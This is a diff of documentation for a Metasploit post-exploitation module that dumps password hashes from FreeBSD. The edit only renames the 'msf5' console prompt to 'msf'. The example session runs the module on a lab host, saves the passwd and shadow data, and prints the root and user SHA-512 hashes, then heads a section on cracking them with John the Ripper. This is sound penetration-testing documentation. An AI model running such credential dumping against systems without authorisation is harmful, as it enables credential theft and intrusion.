@@ -20,12 +20,12 @@
 ### FreeBSD 11.1-RELEASE-i386
 
   ```
-  msf5 > use post/bsd/gather/hashdump 
-  msf5 post(bsd/gather/hashdump) > set session 1
+  msf > use post/bsd/gather/hashdump 
+  msf post(bsd/gather/hashdump) > set session 1
   session => 1
-  msf5 post(bsd/gather/hashdump) > set verbose true
+  msf post(bsd/gather/hashdump) > set verbose true
   verbose => true
-  msf5 post(bsd/gather/hashdump) > run
+  msf post(bsd/gather/hashdump) > run
 
   [!] SESSION may not be compatible with this module.
   [+] passwd saved in: /root/.msf4/loot/20191027022955_default_172.16.191.175_passwd_886442.txt
@@ -34,7 +34,7 @@
   [+] user:$6$0De1rFoA/9y9ZNs/$0w33L7Iox0MGMleEF0mndGGxQ.xKAtWzEo5pzLrN35EonLTnb.NWuHVVbpUQS4aSY0pB2gfi9UXj5zUw2Y7Ds0:1001:1001:user:/home/user:/bin/sh
   [+] Unshadowed Password File: /root/.msf4/loot/20191027022956_default_172.16.191.175_bsd.hashes_729820.txt
   [*] Post module execution completed
-  msf5 post(bsd/gather/hashdump) > creds
+  msf post(bsd/gather/hashdump) > creds
   Credentials
   ===========
 
@@ -43,7 +43,7 @@
         172.16.191.175           root    $6$qHMkv01VUXi9UCIK$ReQbxn2vo/i/nnHHtdw3U8BS0IpPRjJmFS6mYPPAkrqP5bHn1m2ReWiRpfEpHbEtAik6rHGpwdF7jaVZwiq22/         Nonreplayable hash  sha512,crypt
         172.16.191.175           user    $6$0De1rFoA/9y9ZNs/$0w33L7Iox0MGMleEF0mndGGxQ.xKAtWzEo5pzLrN35EonLTnb.NWuHVVbpUQS4aSY0pB2gfi9UXj5zUw2Y7Ds0         Nonreplayable hash  sha512,crypt
   
-  msf5 post(bsd/gather/hashdump) >
+  msf post(bsd/gather/hashdump) >
   ```
 
 ### Crack Hashes (John the Ripper)
